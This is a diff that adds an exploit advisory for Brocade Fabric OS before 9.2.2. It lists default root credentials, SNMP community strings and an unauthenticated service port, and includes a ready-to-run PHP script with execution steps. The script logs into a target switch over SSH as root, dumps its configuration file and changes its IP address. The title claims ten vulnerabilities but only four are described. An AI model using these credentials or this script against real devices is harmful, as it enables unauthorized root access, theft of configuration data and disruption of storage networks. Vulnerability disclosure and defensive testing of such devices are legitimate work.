@@ -1,0 +1,124 @@
+=============================================================================================================================================
+| # Title     : Brocade Fabric OS < 9.2.2 – 10 Critical Vulnerabilities Allowing MITM, Weak Crypto and Hardcoded Key Compromise             |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.broadcom.com/products/fibre-channel-networking/switches                                                         |
+=============================================================================================================================================
+
+POC :
+
+[+] Summary
+    ------------------------------------------------------------
+
+   Brocade Fabric OS versions older than 9.2.2 suffer from multiple
+   high‑risk vulnerabilities including remote code execution,
+   information disclosure, man‑in‑the‑middle, weak cryptography,
+   hardcoded keys, insecure SNMP services, and exploitable default
+   root credentials. A remote attacker can completely compromise the
+   device, execute commands as root, modify network configuration,
+   extract sensitive configuration files, and push malicious firmware.
+
+   ------------------------------------------------------------
+[+] Vulnerabilities
+   ------------------------------------------------------------
+
+[1] Default & Weak Credentials (CVE-2021-27797)
+   - Username: root
+   - Password: fibranne
+  Allows full SSH/Telnet/web root access.
+
+[2] Pre‑Authentication RCE (CVE-2022-33186)
+    - ezswitchsetup protocol on 52357/udp runs as root.
+    - No authentication required.
+    - Attacker can change passwords, alter configs, or take full control.
+
+[3] Insecure SNMP Access
+   - SNMP communities: “Secret C0de”, “OrigEquipMfr”.
+   - Full system info disclosure.
+   - Potential MITM → malicious firmware upload.
+
+[4] Insecure HTTP/Java Access
+    - Credentials sent in base64.
+    - Java management clients downloadable without validation.
+    - Command injection possible.
+
+------------------------------------------------------------
+3. PoC – Remote Root Access (PHP)
+------------------------------------------------------------
+
+<?php
+require 'vendor/autoload.php';
+use phpseclib3\Net\SSH2;
+
+if ($argc < 2) {
+    exit("Usage: php poc.php <target_ip>\n");
+}
+
+$target = $argv[1];
+$user   = 'root';
+$pass   = 'fibranne';
+
+$ssh = new SSH2($target);
+if (!$ssh->login($user, $pass)) {
+    exit("[-] Login failed.\n");
+}
+
+echo "[+] Login success!\n";
+
+// Read sensitive configuration file
+$config = $ssh->exec('cat /etc/fabos/fabos.0.conf');
+echo "[+] Configuration file content:\n";
+echo $config;
+
+// Example of remote command execution (proof only)
+$new_ip = '192.168.1.100';
+$ssh->exec("ifconfig eth0 $new_ip netmask 255.255.255.0");
+
+echo "[+] IP address changed to $new_ip (PoC demonstration).\n";
+?>
+
+------------------------------------------------------------
+4. PoC Execution Guide
+------------------------------------------------------------
+
+Step 1 – Install phpseclib:
+    composer require phpseclib/phpseclib
+
+Step 2 – Save the file as:
+    poc.php
+
+Step 3 – Run the PoC:
+    php poc.php <TARGET-IP>
+
+Example:
+    php poc.php 10.13.3.8
+
+Expected Output:
+    [+] Login success!
+    [+] Configuration file content:
+        <system config appears>
+    [+] IP address changed to 192.168.1.100
+
+------------------------------------------------------------
+5. Recommendations
+------------------------------------------------------------
+
+- Immediately change all default credentials.
+- Restrict management interfaces (SSH/SNMP/HTTP).
+- Disable ezswitchsetup protocol.
+- Upgrade to Fabric OS 9.2.2 or later.
+- Monitor logs for unauthorized access.
+- Verify firmware integrity regularly.
+
+------------------------------------------------------------
+6. References
+------------------------------------------------------------
+
+https://pierrekim.github.io/advisories/2025-brocade-switches.txt
+https://pierrekim.github.io/blog/2025-03-31-brocade-switches-10-vulnerabilities.html
+https://www.broadcom.com/products/fibre-channel-networking/switches
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
